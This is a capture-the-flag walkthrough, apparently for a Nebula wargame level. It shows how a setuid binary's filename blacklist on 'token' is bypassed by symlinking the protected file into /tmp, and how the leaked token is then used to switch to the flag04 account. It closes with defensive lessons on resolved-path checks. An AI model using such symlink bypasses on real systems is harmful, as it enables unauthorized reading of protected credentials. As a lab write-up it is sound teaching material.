
---
### ðŸ”Ž Challenge Summary

> This level includes a binary that restricts users from accessing any file whose name contains the word `"token"`.  
> The goal is to **bypass this naive blacklist** and read the restricted file anyway.

**Login:** `level04 : level04`  
**Target file:** `/home/flag04/token`  
**Binary:** `/home/flag04/flag04`

---

### ðŸ§¬ Source Code Analysis

```c
if(strstr(argv[1], "token") != NULL) {
    printf("You may not access '%s'\n", argv[1]);
    exit(EXIT_FAILURE);
}
```

ðŸš¨ **Issue:**  
The program checks the **filename string**, not the actual file contents or file path once resolved.  
That means symbolic links or hard links can bypass this check.

---

### ðŸŽ¯ Goal

Trick the program into reading the contents of the `token` file **without using the word `token` in the argument**.

---

### ðŸ› ï¸ Exploitation Process

#### ðŸª Step 1: Create a symlink

```bash
ln -s /home/flag04/token /tmp/sneaky
```

This creates a symbolic link named `/tmp/sneaky` pointing to the real `token` file.

#### âš™ï¸ Step 2: Run the binary using the symlink

```bash
cd /home/flag04
./flag04 /tmp/sneaky
```

âœ… Output:

```
06508b5e-x-x-x-x
```

You've successfully read the restricted file.

---

### ðŸ”“ Step 3: Use the token

Now that you have the token, you can proceed as the next user (if required):

```bash
su flag04
Password: [paste token]
getflag
```

âœ… Output:

```
You have successfully executed getflag on a target account
```

---

### ðŸ“˜ Lessons Learned

This challenge highlights how **blacklist-based security** â€” especially when applied to **string comparisons on filenames** â€” is fundamentally weak.

ðŸ§  **Key Takeaway:**

> Donâ€™t trust input string checks when dealing with file access control. Use resolved paths or permission-based checks (e.g., `realpath()`, inode comparisons) instead.

---
	